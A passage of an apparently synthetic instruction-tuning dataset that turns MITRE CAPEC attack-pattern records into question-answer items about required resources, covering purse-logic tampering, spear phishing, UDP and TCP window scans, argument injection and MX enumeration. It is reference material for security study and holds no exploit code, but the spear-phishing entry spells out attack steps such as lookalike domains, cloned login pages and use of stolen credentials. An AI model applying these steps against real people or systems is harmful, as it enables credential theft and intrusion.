            "@Section": "Chapter 2: Scanning, pp. 38-41"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": {
            "Modification_Name": "CAPEC Content Team",
            "Modification_Organization": "The MITRE Corporation",
            "Modification_Date": "2018-07-31",
            "Modification_Comment": "Updated Description Summary, Related_Weaknesses"
          }
        }
      }
    }
  },
  {
    "instruction": "What are the required resources to execute the attack pattern: Removing/short-circuiting 'Purse' logic: removing/mutating 'cash' decrements (CAPEC ID: 208)",
    "context": "",
    "output": "The resources required to execute Removing/short-circuiting 'Purse' logic: removing/mutating 'cash' decrements (CAPEC ID: 208) are the following: The attacker must have access to the client for the targeted service (this step is trivial for most web-based services). The attacker must also be able to reverse engineer the client in order to locate and modify the client's purse logic. Reverse engineering tools would be necessary for this.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "The attacker must have access to the client for the targeted service (this step is trivial for most web-based services). The attacker must also be able to reverse engineer the client in order to locate and modify the client's purse logic. Reverse engineering tools would be necessary for this.",
      "@Name": "Removing/short-circuiting 'Purse' logic: removing/mutating 'cash' decrements (CAPEC ID: 208)",
      "attack_ptrn": {
        "@ID": "208",
        "@Name": "Removing/short-circuiting 'Purse' logic: removing/mutating 'cash' decrements",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An attacker removes or modifies the logic on a client associated with monetary calculations resulting in incorrect information being sent to the server. A server may rely on a client to correctly compute monetary information. For example, a server might supply a price for an item and then rely on the client to correctly compute the total cost of a purchase given the number of items the user is buying. If the attacker can remove or modify the logic that controls these calculations, they can return incorrect values to the server. The attacker can use this to make purchases for a fraction of the legitimate cost or otherwise avoid correct billing for activities.",
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "207"
          }
        },
        "Prerequisites": {
          "Prerequisite": "The targeted server must rely on the client to correctly perform monetary calculations and must fail to detect errors in these calculations."
        },
        "Resources_Required": {
          "Resource": "The attacker must have access to the client for the targeted service (this step is trivial for most web-based services). The attacker must also be able to reverse engineer the client in order to locate and modify the client's purse logic. Reverse engineering tools would be necessary for this."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "602"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-12-07",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Resources_Required"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Provide the resources needed so the attacker can use the attack pattern: Spear Phishing (CAPEC ID: 163)",
    "context": "",
    "output": "Here is the list of resources required to implement attack pattern Spear Phishing (CAPEC ID: 163):\nAn adversay must have the ability communicate their phishing scheme to the victims (via email, instance message, etc.), as well as a website or other platform for victims to enter personal information into.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "An adversay must have the ability communicate their phishing scheme to the victims (via email, instance message, etc.), as well as a website or other platform for victims to enter personal information into.",
      "@Name": "Spear Phishing (CAPEC ID: 163)",
      "attack_ptrn": {
        "@ID": "163",
        "@Name": "Spear Phishing",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An adversary targets a specific user or group with a Phishing (CAPEC-98) attack tailored to a category of users in order to have maximum relevance and deceptive capability. Spear Phishing is an enhanced version of the Phishing attack targeted to a specific user or group. The quality of the targeted email is usually enhanced by appearing to come from a known or trusted entity. If the email account of some trusted entity has been compromised the message may be digitally signed. The message will contain information specific to the targeted users that will enhance the probability that they will follow the URL to the compromised site. For example, the message may indicate knowledge of the targets employment, residence, interests, or other information that suggests familiarity. As soon as the user follows the instructions in the message, the attack proceeds as a standard Phishing attack.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "98"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Obtain useful contextual detailed information about the targeted user or organization] An adversary collects useful contextual detailed information about the targeted user or organization in order to craft a more deceptive and enticing message to lure the target into responding.",
              "Technique": [
                "Conduct web searching research of target. See also: CAPEC-118.",
                "Identify trusted associates, colleagues and friends of target. See also: CAPEC-118.",
                "Utilize social engineering attack patterns such as Pretexting. See also: CAPEC-407.",
                "Collect social information via dumpster diving. See also: CAPEC-406.",
                "Collect social information via traditional sources. See also: CAPEC-118.",
                "Collect social information via Non-traditional sources. See also: CAPEC-118."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Optional: Obtain domain name and certificate to spoof legitimate site] This optional step can be used to help the adversary impersonate the legitimate site more convincingly. The adversary can use homograph attacks to convince users that they are using the legitimate website. Note that this step is not required for phishing attacks, and many phishing attacks simply supply URLs containing an IP address and no SSL certificate.",
              "Technique": [
                "Optionally obtain a domain name that visually looks similar to the legitimate site's domain name. An example is www.paypaI.com vs. www.paypal.com (the first one contains a capital i, instead of a lower case L).",
                "Optionally obtain a legitimate SSL certificate for the new domain name."
              ]
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Optional: Explore legitimate website and create duplicate] An adversary creates a website (optionally at a URL that looks similar to the original URL) that closely resembles the website that they are trying to impersonate. That website will typically have a login form for the victim to put in their authentication credentials. There can be different variations on a theme here.",
              "Technique": [
                "Use spidering software to get copy of web pages on legitimate site.",
                "Manually save copies of required web pages from legitimate site.",
                "Create new web pages that have the legitimate site's look at feel, but contain completely new content."
              ]
            },
            {
              "Step": "4",
              "Phase": "Experiment",
              "Description": "[Optional: Build variants of the website with very specific user information e.g., living area, etc.] Once the adversary has their website which duplicates a legitimate website, they need to build very custom user related information in it. For example, they could create multiple variants of the website which would target different living area users by providing information such as local news, local weather, etc. so that the user believes this is a new feature from the website.",
              "Technique": "Integrate localized information in the web pages created to duplicate the original website. Those localized information could be dynamically generated based on unique key or IP address of the future victim."
            },
            {
              "Step": "5",
              "Phase": "Exploit",
              "Description": "[Convince user to enter sensitive information on adversary's site.] An adversary sends a message (typically an e-mail) to the victim that has some sort of a call to action to get the user to click on the link included in the e-mail (which takes the victim to adversary's website) and log in. The key is to get the victim to believe that the message is coming from a legitimate entity trusted by the victim or with which the victim or does business and that the website pointed to by the URL in the e-mail is the legitimate website. A call to action will usually need to sound legitimate and urgent enough to prompt action from the user.",
              "Technique": [
                "Send the user a message from a spoofed legitimate-looking e-mail address that asks the user to click on the included link.",
                "Place phishing link in post to online forum."
              ]
            },
            {
              "Step": "6",
              "Phase": "Exploit",
              "Description": "[Use stolen credentials to log into legitimate site] Once the adversary captures some sensitive information through phishing (login credentials, credit card information, etc.) the adversary can leverage this information. For instance, the adversary can use the victim's login credentials to log into their bank account and transfer money to an account of their choice.",
              "Technique": "Log in to the legitimate site using another user's supplied credentials."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "None. Any user can be targeted by a Spear Phishing attack."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "Spear phishing attacks require specific knowledge of the victims being targeted, such as which bank is being used by the victims, or websites they commonly log into (Google, Facebook, etc)."
          }
        },
        "Resources_Required": {
          "Resource": "An adversay must have the ability communicate their phishing scheme to the victims (via email, instance message, etc.), as well as a website or other platform for victims to enter personal information into."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data",
              "Note": "Information Leakage"
            },
            {
              "Scope": [
                "Accountability",
                "Authentication",
                "Authorization",
                "Non-Repudiation"
              ],
              "Impact": "Gain Privileges",
              "Note": "Privilege Escalation"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data",
              "Note": "Data Modification"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": "Do not follow any links that you receive within your e-mails and certainly do not input any login credentials on the page that they take you too. Instead, call your Bank, PayPal, eBay, etc., and inquire about the problem. A safe practice would also be to type the URL of your bank in the browser directly and only then log in. Also, never reply to any e-mails that ask you to provide sensitive information of any kind."
        },
        "Example_Instances": {
          "Example": [
            "The target gets an official looking e-mail from their bank stating that their account has been temporarily locked due to suspected unauthorized activity that happened in a different area from where they live (details might be provided by the spear phishers) and that they need to click on the link included in the e-mail to log in to their bank account in order to unlock it. The link in the e-mail looks very similar to that of their bank and once the link is clicked, the log in page is the exact replica. The target supplies their login credentials after which they are notified that their account has now been unlocked and that everything is fine. An adversary has just collected the target's online banking information which can now be used by them to log into the target's bank account and transfer money to a bank account of the adversary's choice.",
            "An adversary can leverage a weakness in the SMB protocol by sending the target, an official looking e-mail from their employer's IT Department stating that their system has vulnerable software, which they need to manually patch by accessing an updated version of the software by clicking on a provided link to a network share. Once the link is clicked, the target is directed to an external server controlled by the adversary or to a malicious file on a public access share. The SMB protocol will then attempt to authenticate the target to the adversary controlled server, which allows the adversary to capture the hashed credentials over SMB. These credentials can then be used to execute offline brute force attacks or a \"Pass The Hash\" attack."
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "451"
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": [
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1534",
              "Entry_Name": "Internal Spearfishing"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1566.001",
              "Entry_Name": "Phishing: Spearfishing Attachment"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1566.002",
              "Entry_Name": "Phishing: Spearfishing Link"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1566.003",
              "Entry_Name": "Phishing: Spearfishing via Service"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1598.001",
              "Entry_Name": "Phishing for Information: Spearfishing Service"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1598.002",
              "Entry_Name": "Phishing for Information: Spearfishing Attachment"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1598.003",
              "Entry_Name": "Phishing for Information: Spearfishing Link"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-01-09",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Attack_Phases, Attacker_Skills_or_Knowledge_Required, Description Summary, Examples-Instances, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attack_Phases, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Example_Instances, Related_Attack_Patterns, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Example_Instances, Execution_Flow, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2023-01-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "List the required resources to perform the following capec attack pattern: UDP Scan (CAPEC ID: 308)",
    "context": "",
    "output": "required resources:\nThe ability to craft custom UDP Packets for use during network reconnaissance. This can be accomplished via the use of a port scanner, or via socket manipulation in a programming or scripting language. Packet injection tools are also useful. It is also necessary to trap ICMP diagnostic messages during this process. Depending upon the method used it may be necessary to sniff the network in order to see the response.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "The ability to craft custom UDP Packets for use during network reconnaissance. This can be accomplished via the use of a port scanner, or via socket manipulation in a programming or scripting language. Packet injection tools are also useful. It is also necessary to trap ICMP diagnostic messages during this process. Depending upon the method used it may be necessary to sniff the network in order to see the response.",
      "@Name": "UDP Scan (CAPEC ID: 308)",
      "attack_ptrn": {
        "@ID": "308",
        "@Name": "UDP Scan",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": "An adversary engages in UDP scanning to gather information about UDP port status on the target system. UDP scanning methods involve sending a UDP datagram to the target port and looking for evidence that the port is closed. Open UDP ports usually do not respond to UDP datagrams as there is no stateful mechanism within the protocol that requires building or establishing a session. Responses to UDP datagrams are therefore application specific and cannot be relied upon as a method of detecting an open port. UDP scanning relies heavily upon ICMP diagnostic messages in order to determine the status of a remote port.",
        "Extended_Description": {
          "xhtml:p": "During a UDP scan, a datagram is sent to a target port. If an 'ICMP Type 3 Port unreachable' error message is returned then the port is considered closed. Different types of ICMP messages can indicate a filtered port. UDP scanning is slower than TCP scanning. The protocol characteristics of UDP make port scanning inherently more difficult than with TCP, as well as dependent upon ICMP for accurate scanning. Due to ambiguities that can arise between open ports and filtered ports, UDP scanning results often require a high degree of interpretation and further testing to refine. In general, UDP scanning results are less reliable or accurate than TCP-based scanning."
        },
        "Typical_Severity": "Low",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "300"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Experiment",
              "Description": "An adversary sends UDP packets to target ports."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "An adversary uses the response from the target to determine the port's state. Whether a port responds to a UDP packet is dependant on what application is listening on that port. No response does not indicate the port is not open."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "The ability to send UDP datagrams to a host and receive ICMP error messages from that host. In cases where particular types of ICMP messaging is disallowed, the reliability of UDP scanning drops off sharply."
        },
        "Resources_Required": {
          "Resource": "The ability to craft custom UDP Packets for use during network reconnaissance. This can be accomplished via the use of a port scanner, or via socket manipulation in a programming or scripting language. Packet injection tools are also useful. It is also necessary to trap ICMP diagnostic messages during this process. Depending upon the method used it may be necessary to sniff the network in order to see the response."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Confidentiality",
              "Impact": "Other"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": [
                "Bypass Protection Mechanism",
                "Hide Activities"
              ]
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Firewalls or ACLs which block egress ICMP error types effectively prevent UDP scans from returning any useful information.",
            "UDP scanning is complicated by rate limiting mechanisms governing ICMP error messages."
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "200"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-33",
              "@Section": "Chapter 2: Scanning, pg. 54-69"
            },
            {
              "@External_Reference_ID": "REF-158"
            },
            {
              "@External_Reference_ID": "REF-34",
              "@Section": "Section 5.4 RPC Grinding, pg. 101"
            },
            {
              "@External_Reference_ID": "REF-130"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Description, Description Summary, References, Related_Weaknesses, Solutions_and_Mitigations"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Provide the resources needed so the attacker can use the attack pattern: TCP Window Scan (CAPEC ID: 306)",
    "context": "",
    "output": "Here is the list of resources required to implement attack pattern TCP Window Scan (CAPEC ID: 306):\nThe ability to send TCP segments with a custom window size to a host during network reconnaissance. This can be achieved via the use of a network mapper or scanner, or via raw socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "The ability to send TCP segments with a custom window size to a host during network reconnaissance. This can be achieved via the use of a network mapper or scanner, or via raw socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response.",
      "@Name": "TCP Window Scan (CAPEC ID: 306)",
      "attack_ptrn": {
        "@ID": "306",
        "@Name": "TCP Window Scan",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": "An adversary engages in TCP Window scanning to analyze port status and operating system type. TCP Window scanning uses the ACK scanning method but examine the TCP Window Size field of response RST packets to make certain inferences. While TCP Window Scans are fast and relatively stealthy, they work against fewer TCP stack implementations than any other type of scan. Some operating systems return a positive TCP window size when a RST packet is sent from an open port, and a negative value when the RST originates from a closed port. TCP Window scanning is one of the most complex scan types, and its results are difficult to interpret. Window scanning alone rarely yields useful information, but when combined with other types of scanning is more useful. It is a generally more reliable means of making inference about operating system versions than port status.",
        "Typical_Severity": "Low",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "300"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Experiment",
              "Description": "An adversary sends TCP packets with the ACK flag set and that are not associated with an existing connection to target ports."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "An adversary uses the response from the target to determine the port's state. Specifically, the adversary views the TCP window size from the returned RST packet if one was received. Depending on the target operating system, a positive window size may indicate an open port while a negative window size may indicate a closed port."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "TCP Window scanning requires the use of raw sockets, and thus cannot be performed from some Windows systems (Windows XP SP 2, for example). On Unix and Linux, raw socket manipulations require root privileges."
        },
        "Resources_Required": {
          "Resource": "The ability to send TCP segments with a custom window size to a host during network reconnaissance. This can be achieved via the use of a network mapper or scanner, or via raw socket programming in a scripting language. Packet injection tools are also useful for this purpose. Depending upon the method used it may be necessary to sniff the network in order to see the response."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Confidentiality",
              "Impact": "Other"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": [
                "Bypass Protection Mechanism",
                "Hide Activities"
              ]
            }
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "200"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-33",
              "@Section": "Chapter 2: Scanning, pg. 55-56"
            },
            {
              "@External_Reference_ID": "REF-128"
            },
            {
              "@External_Reference_ID": "REF-34",
              "@Section": "Section 5.8 TCP Window Scan, pg. 115"
            },
            {
              "@External_Reference_ID": "REF-130"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Description, Description Summary, References, Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Execution_Flow"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "List the required resources to perform the following capec attack pattern: Software Integrity Attack (CAPEC ID: 184)",
    "context": "",
    "output": "required resources:\nSoftware Integrity Attacks are usually a late stage focus of attack activity which depends upon the success of a chain of prior events. The resources required to perform the attack vary with respect to the overall attack strategy, existing countermeasures which must be bypassed, and the success of early phase attack vectors.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "Software Integrity Attacks are usually a late stage focus of attack activity which depends upon the success of a chain of prior events. The resources required to perform the attack vary with respect to the overall attack strategy, existing countermeasures which must be bypassed, and the success of early phase attack vectors.",
      "@Name": "Software Integrity Attack (CAPEC ID: 184)",
      "attack_ptrn": {
        "@ID": "184",
        "@Name": "Software Integrity Attack",
        "@Abstraction": "Meta",
        "@Status": "Draft",
        "Description": "An attacker initiates a series of events designed to cause a user, program, server, or device to perform actions which undermine the integrity of software code, device data structures, or device firmware, achieving the modification of the target's integrity to achieve an insecure state.",
        "Typical_Severity": "Low",
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "Manual or user-assisted attacks require deceptive mechanisms to trick the user into clicking a link or downloading and installing software. Automated update attacks require the attacker to host a payload and then trigger the installation of the payload code."
          }
        },
        "Resources_Required": {
          "Resource": "Software Integrity Attacks are usually a late stage focus of attack activity which depends upon the success of a chain of prior events. The resources required to perform the attack vary with respect to the overall attack strategy, existing countermeasures which must be bypassed, and the success of early phase attack vectors."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "494"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated Activation_Zone, Injection_Vector, Payload, Payload_Activation_Impact, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attacker_Skills_or_Knowledge_Required"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2015-11-09",
            "#text": "Software Integrity Attacks"
          }
        }
      }
    }
  },
  {
    "instruction": "What are the required resources to execute the attack pattern: Argument Injection (CAPEC ID: 6)",
    "context": "",
    "output": "The resources required to execute Argument Injection (CAPEC ID: 6) are the following: Ability to communicate synchronously or asynchronously with server. Optionally, ability to capture output directly through synchronous communication or other method such as FTP.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "Ability to communicate synchronously or asynchronously with server. Optionally, ability to capture output directly through synchronous communication or other method such as FTP.",
      "@Name": "Argument Injection (CAPEC ID: 6)",
      "attack_ptrn": {
        "@ID": "6",
        "@Name": "Argument Injection",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An attacker changes the behavior or state of a targeted application through injecting data or command syntax through the targets use of non-validated and non-filtered arguments of exposed services or methods.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "137",
            "Exclude_Related": {
              "@Exclude_ID": "403"
            }
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Discovery of potential injection vectors] Using an automated tool or manual discovery, the attacker identifies services or methods with arguments that could potentially be used as injection vectors (OS, API, SQL procedures, etc.).",
              "Technique": [
                "Manually cover the application and record the possible places where arguments could be passed into external systems.",
                "Use a spider, for web applications, to create a list of URLs and associated inputs."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[1. Attempt variations on argument content] Possibly using an automated tool, the attacker will perform injection variations of the arguments.",
              "Technique": [
                "Use a very large list of probe strings in order to detect if there is a positive result, and, what type of system has been targeted (if obscure).",
                "Use a proxy tool to record results, error messages and/or log if accessible."
              ]
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Abuse of the application] The attacker injects specific syntax into a particular argument in order to generate a specific malicious effect in the targeted application.",
              "Technique": "Manually inject specific payload into targeted argument."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "Target software fails to strip all user-supplied input of any content that could cause the shell to perform unexpected actions.",
            "Software must allow for unvalidated or unfiltered input to be executed on operating system shell, and, optionally, the system configuration must allow for output to be sent back to client."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "The attacker has to identify injection vector, identify the operating system-specific commands, and optionally collect the output."
          }
        },
        "Resources_Required": {
          "Resource": "Ability to communicate synchronously or asynchronously with server. Optionally, ability to capture output directly through synchronous communication or other method such as FTP."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Design: Do not program input values directly on command shell, instead treat user input as guilty until proven innocent. Build a function that takes user input and converts it to applications specific types and values, stripping or filtering out all unauthorized commands and characters in the process.",
            "Design: Limit program privileges, so if metacharacters or other methods circumvent program input validation routines and shell access is attained then it is not running under a privileged account. chroot jails create a sandbox for the application to execute in, making it more difficult for an attacker to elevate privilege even in the case that a compromise has occurred.",
            "Implementation: Implement an audit log that is written to a separate host, in the event of a compromise the audit log may be able to provide evidence and details of the compromise."
          ]
        },
        "Example_Instances": {
          "Example": "A recent example instance of argument injection occurred against Java Web Start technology, which eases the client side deployment for Java programs. The JNLP files that are used to describe the properties for the program. The client side Java runtime used the arguments in the property setting to define execution parameters, but if the attacker appends commands to an otherwise legitimate property file, then these commands are sent to the client command shell. [REF-482]"
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "74"
            },
            {
              "@CWE_ID": "146"
            },
            {
              "@CWE_ID": "184"
            },
            {
              "@CWE_ID": "78"
            },
            {
              "@CWE_ID": "185"
            },
            {
              "@CWE_ID": "697"
            }
          ]
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-1"
            },
            {
              "@External_Reference_ID": "REF-482"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Example_Instances"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Provide the resources needed so the attacker can use the attack pattern: Enumerate Mail Exchange (MX) Records (CAPEC ID: 290)",
    "context": "",
    "output": "Here is the list of resources required to implement attack pattern Enumerate Mail Exchange (MX) Records (CAPEC ID: 290):\nA command-line utility or other application capable of sending requests to the DNS server is necessary.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "A command-line utility or other application capable of sending requests to the DNS server is necessary.",
      "@Name": "Enumerate Mail Exchange (MX) Records (CAPEC ID: 290)",
      "attack_ptrn": {
        "@ID": "290",
        "@Name": "Enumerate Mail Exchange (MX) Records",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": "An adversary enumerates the MX records for a given via a DNS query. This type of information gathering returns the names of mail servers on the network. Mail servers are often not exposed to the Internet but are located within the DMZ of a network protected by a firewall. A side effect of this configuration is that enumerating the MX records for an organization my reveal the IP address of the firewall or possibly other internal systems. Attackers often resort to MX record enumeration when a DNS Zone Transfer is not possible.",
        "Typical_Severity": "Low",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "309"
          }
        },
        "Prerequisites": {
          "Prerequisite": "The adversary requires access to a DNS server that will return the MX records for a network."
        },
        "Resources_Required": {
          "Resource": "A command-line utility or other application capable of sending requests to the DNS server is necessary."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Confidentiality",
              "Impact": "Other"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
